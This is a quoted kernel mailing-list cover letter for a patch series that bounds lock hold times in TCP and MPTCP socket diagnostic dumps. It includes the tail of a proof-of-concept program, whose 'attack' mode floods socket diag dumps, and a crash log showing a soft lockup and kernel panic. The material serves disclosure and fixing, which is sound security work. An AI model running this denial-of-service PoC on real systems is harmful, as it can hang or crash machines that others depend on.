>                                 return 1;
>                         }
>                 } else if (strcmp(argv[i], "--stride") =3D=3D 0) {
>                         if (i + 1 >=3D (unsigned int)argc ||
>                             parse_u32(argv[++i], &opts.stride) < 0 ||
>                             opts.stride =3D=3D 0) {
>                                 usage(argv[0]);
>                                 return 1;
>                         }
>                 } else if (strcmp(argv[i], "--port") =3D=3D 0) {
>                         if (i + 1 >=3D (unsigned int)argc ||
>                             parse_port(argv[++i], &opts.port) < 0) {
>                                 usage(argv[0]);
>                                 return 1;
>                         }
>                 } else if (strcmp(argv[i], "--cpu") =3D=3D 0) {
>                         if (i + 1 >=3D (unsigned int)argc ||
>                             parse_u32(argv[++i], &opts.cpu) < 0) {
>                                 usage(argv[0]);
>                                 return 1;
>                         }
>                         opts.cpu_set =3D true;
>                 } else if (strcmp(argv[i], "--compare") =3D=3D 0) {
>                         opts.compare =3D true;
>                 } else if (strcmp(argv[i], "--no-attack") =3D=3D 0) {
>                         opts.attack =3D false;
>                 } else if (strcmp(argv[i], "--listen") =3D=3D 0) {
>                         opts.listen_mode =3D true;
>                 } else if (strcmp(argv[i], "--bound") =3D=3D 0) {
>                         opts.listen_mode =3D false;
>                 } else {
>                         usage(argv[0]);
>                         return 1;
>                 }
>         }
>
>         if (opts.groups > UINT32_MAX / opts.sockets) {
>                 fprintf(stderr, "socket count overflow\n");
>                 return 1;
>         }
>
>         if (raise_nofile_limit((rlim_t)opts.sockets * opts.groups + 64U) =
< 0)
>                 return 1;
>
>         if (opts.cpu_set && pin_to_cpu(opts.cpu) < 0)
>                 return 1;
>
>         if (setup_sockets(opts.listen_mode, opts.groups, opts.sockets,
>                           opts.stride, opts.port, &fds, &port) < 0)
>                 return 1;
>
>         printf("setup_complete groups=3D%u sockets_per_group=3D%u total_s=
ockets=3D%u base_port=3D%d stride=3D%u mode=3D%s nops=3D%u repeat=3D%u comp=
are=3D%s attack=3D%s\n",
>                opts.groups, opts.sockets, opts.groups * opts.sockets,
>                port, opts.stride, opts.listen_mode ? "listen" : "bound",
>                opts.nops, opts.repeat,
>                opts.compare ? "yes" : "no",
>                opts.attack ? "yes" : "no");
>
>         if (opts.compare) {
>                 double wall_ms;
>
>                 if (run_dump(opts.listen_mode, false, 0, &wall_ms) < 0) {
>                         teardown_sockets(fds, opts.groups * opts.sockets)=
;
>                         return 1;
>                 }
>                 printf("baseline wall_ms=3D%.3f\n", wall_ms);
>         }
>
>         if (opts.attack) {
>                 for (i =3D 0; i < opts.repeat; i++) {
>                         double wall_ms;
>
>                         if (run_dump(opts.listen_mode, true, opts.nops, &=
wall_ms) < 0) {
>                                 teardown_sockets(fds, opts.groups * opts.=
sockets);
>                                 return 1;
>                         }
>                         printf("attack_run=3D%u wall_ms=3D%.3f\n", i + 1,=
 wall_ms);
>                 }
>         }
>
>         teardown_sockets(fds, opts.groups * opts.sockets);
>         return 0;
> }
> ------END poc.c--------
>
> ----BEGIN crash log----
> watchdog: BUG: soft lockup - CPU#1 stuck for 3s! [poc:256]
> [   21.507468] Modules linked in:
> [   21.507471] CPU: 1 UID: 0 PID: 256 Comm: poc Not tainted 7.2.0-rc4-003=
90-g743916aa8e8c #5 PREEMPT(full)
> [   21.507472] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arc=
h_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [   21.507473] RIP: 0010:inet_diag_bc_sk (inet_diag.c:471 inet_diag.c:631=
)
> [   21.507499] Code: 00 00 00 0f 87 89 00 00 00 3c 02 0f 84 4e 01 00 00 3=
c 03 0f 84 72 01 00 00 3c 01 75 31 0f b7 53 02 29 d5 48 01 d3 85 ed 7e 31 <=
0f> b6 03 3c 08 76 c2 3c 0b 0f 84 76 01 00 00 77 3a 3c 09 0f 84 54
> All code
> =3D=3D=3D=3D=3D=3D=3D=3D
>    0:   00 00                   add    %al,(%rax)
>    2:   00 0f                   add    %cl,(%rdi)
>    4:   87 89 00 00 00 3c       xchg   %ecx,0x3c000000(%rcx)
>    a:   02 0f                   add    (%rdi),%cl
>    c:   84 4e 01                test   %cl,0x1(%rsi)
>    f:   00 00                   add    %al,(%rax)
>   11:   3c 03                   cmp    $0x3,%al
>   13:   0f 84 72 01 00 00       je     0x18b
>   19:   3c 01                   cmp    $0x1,%al
>   1b:   75 31                   jne    0x4e
>   1d:   0f b7 53 02             movzwl 0x2(%rbx),%edx
>   21:   29 d5                   sub    %edx,%ebp
>   23:   48 01 d3                add    %rdx,%rbx
>   26:   85 ed                   test   %ebp,%ebp
>   28:   7e 31                   jle    0x5b
>   2a:*  0f b6 03                movzbl (%rbx),%eax              <-- trapp=
ing instruction
>   2d:   3c 08                   cmp    $0x8,%al
>   2f:   76 c2                   jbe    0xfffffffffffffff3
>   31:   3c 0b                   cmp    $0xb,%al
>   33:   0f 84 76 01 00 00       je     0x1af
>   39:   77 3a                   ja     0x75
>   3b:   3c 09                   cmp    $0x9,%al
>   3d:   0f                      .byte 0xf
>   3e:   84                      .byte 0x84
>   3f:   54                      push   %rsp
>
> Code starting with the faulting instruction
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>    0:   0f b6 03                movzbl (%rbx),%eax
>    3:   3c 08                   cmp    $0x8,%al
>    5:   76 c2                   jbe    0xffffffffffffffc9
>    7:   3c 0b                   cmp    $0xb,%al
>    9:   0f 84 76 01 00 00       je     0x185
>    f:   77 3a                   ja     0x4b
>   11:   3c 09                   cmp    $0x9,%al
>   13:   0f                      .byte 0xf
>   14:   84                      .byte 0x84
>   15:   54                      push   %rsp
> [   21.507500] RSP: 0018:ffffbb290036b7a8 EFLAGS: 00000202
> [   21.507501] RAX: 0000000000000000 RBX: ffff98bcf7ca2588 RCX: 000000000=
0000000
> [   21.507502] RDX: 0000000000000004 RSI: ffff98bcf7ca0048 RDI: ffff98bcf=
61c9840
> [   21.507502] RBP: 000000000000dabc R08: 0000000000000000 R09: ffff98bcd=
fb91440
> [   21.507502] R10: 0000000000000000 R11: ffff98bcdfb91444 R12: 000000000=
0000000
> [   21.507503] R13: 0000000000002f10 R14: 0000000000000000 R15: 000000000=
0000002
> [   21.507508] FS:  0000000002be8380(0000) GS:ffff98bda3b6e000(0000) knlG=
S:0000000000000000
> [   21.507509] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [   21.507510] CR2: 00007f62b3bb9000 CR3: 000000000c6b6005 CR4: 000000000=
0370ef0
> [   21.507510] Call Trace:
> [   21.507512]  <TASK>
> [   21.507512]  ? inet_diag_bc_sk (inet_diag.c:632)
> [   21.507514]  tcp_diag_dump (tcp_diag.c:366)
> [   21.507524]  ? ___slab_alloc (slub.c:1080 slub.c:4524)
> [   21.507526]  ? __kmalloc_node_track_caller_noprof (slub.c:4936 slub.c:=
5361 slub.c:5497)
> [   21.507527]  ? inet_diag_handler_cmd (netlink.h:341 inet_diag.c:983)
> [   21.507528]  ? __alloc_skb (skbuff.c:715)
> [   21.507531]  ? kmalloc_reserve (skbuff.c:637 (discriminator 1))
> [   21.507532]  __inet_diag_dump (inet_diag.c:823)
> [   21.507533]  netlink_dump (af_netlink.c:2331)
> [   21.507543]  __netlink_dump_start (af_netlink.c:2446)
> [   21.507544]  inet_diag_handler_cmd (netlink.h:341 inet_diag.c:983)
> [   21.507545]  ? __pfx_inet_diag_dump_start (inet_diag.c:891)
> [   21.507546]  ? __pfx_inet_diag_dump (inet_diag.c:928)
> [   21.507547]  ? __pfx_inet_diag_dump_done (inet_diag.c:508)
> [   21.507548]  sock_diag_rcv_msg (sock_diag.c:248 sock_diag.c:284)
> [   21.507550]  ? __pfx_sock_diag_rcv_msg (sock_diag.c:306)
> [   21.507551]  netlink_rcv_skb (af_netlink.c:2556)
> [   21.507553]  netlink_unicast (af_netlink.c:1319 af_netlink.c:1345)
> [   21.507554]  netlink_sendmsg (af_netlink.c:1900)
> [   21.507556]  ____sys_sendmsg (socket.c:775 (discriminator 1) socket.c:=
790 (discriminator 1) socket.c:2684 (discriminator 1))
> [   21.507558]  ___sys_sendmsg (socket.c:2738)
> [   21.507559]  __sys_sendmsg (socket.c:2770)
> [   21.507560]  do_syscall_64 (syscall_64.c:63 syscall_64.c:94)
> [   21.507563]  entry_SYSCALL_64_after_hwframe (entry_64.S:121)
> [   21.507564] RIP: 0033:0x421964
> [   21.507566] Code: c2 c0 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff e=
b b5 0f 1f 00 f3 0f 1e fa 80 3d fd 26 09 00 00 74 13 b8 2e 00 00 00 0f 05 <=
48> 3d 00 f0 ff ff 77 4c c3 0f 1f 00 55 48 89 e5 48 83 ec 20 89 55
> All code
> =3D=3D=3D=3D=3D=3D=3D=3D
>    0:   c2 c0 ff                ret    $0xffc0
>    3:   ff                      (bad)
>    4:   ff f7                   push   %rdi
>    6:   d8 64 89 02             fsubs  0x2(%rcx,%rcx,4)
>    a:   48 c7 c0 ff ff ff ff    mov    $0xffffffffffffffff,%rax
>   11:   eb b5                   jmp    0xffffffffffffffc8
>   13:   0f 1f 00                nopl   (%rax)
>   16:   f3 0f 1e fa             endbr64
>   1a:   80 3d fd 26 09 00 00    cmpb   $0x0,0x926fd(%rip)        # 0x9271=
e
>   21:   74 13                   je     0x36
>   23:   b8 2e 00 00 00          mov    $0x2e,%eax
>   28:   0f 05                   syscall
>   2a:*  48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax         <=
-- trapping instruction
>   30:   77 4c                   ja     0x7e
>   32:   c3                      ret
>   33:   0f 1f 00                nopl   (%rax)
>   36:   55                      push   %rbp
>   37:   48 89 e5                mov    %rsp,%rbp
>   3a:   48 83 ec 20             sub    $0x20,%rsp
>   3e:   89                      .byte 0x89
>   3f:   55                      push   %rbp
>
> Code starting with the faulting instruction
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>    0:   48 3d 00 f0 ff ff       cmp    $0xfffffffffffff000,%rax
>    6:   77 4c                   ja     0x54
>    8:   c3                      ret
>    9:   0f 1f 00                nopl   (%rax)
>    c:   55                      push   %rbp
>    d:   48 89 e5                mov    %rsp,%rbp
>   10:   48 83 ec 20             sub    $0x20,%rsp
>   14:   89                      .byte 0x89
>   15:   55                      push   %rbp
> [   21.507567] RSP: 002b:00007ffde1d1cfc8 EFLAGS: 00000202 ORIG_RAX: 0000=
00000000002e
> [   21.507568] RAX: ffffffffffffffda RBX: 0000000002bea910 RCX: 000000000=
0421964
> [   21.507570] RDX: 0000000000000000 RSI: 00007ffde1d1d040 RDI: 000000000=
0020003
> [   21.507571] RBP: 0000000000020003 R08: 0006b49d20000000 R09: 00007f62b=
3bb50e8
> [   21.507571] R10: 0000000000000004 R11: 0000000000000202 R12: 00007ffde=
1d1d110
> [   21.507571] R13: 0000000000003ffc R14: 0000000000010044 R15: 000000000=
000fffc
> [   21.507572]  </TASK>
> [   21.507573] Kernel panic - not syncing: softlockup: hung tasks
> -----END crash log-----
>
> Best regards,
> Zihan Xi
>
> changes in v2:
>   - Rebased onto net commit e2a6641e3bfd (2026-08-27).
>   - Corrected the non-listener PoC state mask to TCPF_BOUND_INACTIVE.
>   - Added current-bucket cursor validation for TCP listener, bind, and
>     ehash paths, and for MPTCP listeners, with safe restart on mismatch.
>   - Reject listen/ehash/MPTCP listener cursors unless sk_state still
>     matches the table being walked.
>   - Count TIME_WAIT bind nodes toward the batch limit and resume them via
>     tw_tb2 instead of treating them as inet_connection_sock.
>   - Kept the listener and bound-only TCP Fixes tags; dropped 7e3aab4a9cd7
>     because that commit only converted the existing ehash dump lock type.
>   - Sorted new TCP dump local declarations reverse xmas tree.
>   - Moved INET_DIAG_DUMP_CURSOR_MPTCP_LISTEN into the MPTCP patch.
>   - Read icsk_ulp_data with rcu_dereference() after dropping the MPTCP
>     listener lock.
>   - Refreshed the inline PoC and matching decoded crash log artifacts.
>   - Corrected wording and removed duplicate crash-log provenance text.
>   - Made PoC defaults match unshare -Urn ./poc (4 listener groups).
>   - Clarified crash-log UID 0, cursor fallback restart, and that UDP/RAW
>     diag locks are outside this series.
>   - v1 Link: https://lore.kernel.org/all/cover.1785307984.git.zihanx@nebu=
sec.ai/
>
> Zihan Xi (2):
>   tcp: diag: bound bucket lock hold in tcp_diag_dump()
>   mptcp: diag: bound listener bucket lock hold
>
>  include/linux/inet_diag.h     |  15 ++
>  include/net/inet_hashtables.h |  18 ++
>  net/ipv4/inet_diag.c          |  13 ++
>  net/ipv4/inet_hashtables.c    |  18 --
>  net/ipv4/tcp_diag.c           | 338 +++++++++++++++++++++++++---------
>  net/mptcp/mptcp_diag.c        | 124 +++++++++----
>  6 files changed, 383 insertions(+), 143 deletions(-)
>
> --
> 2.43.0
>
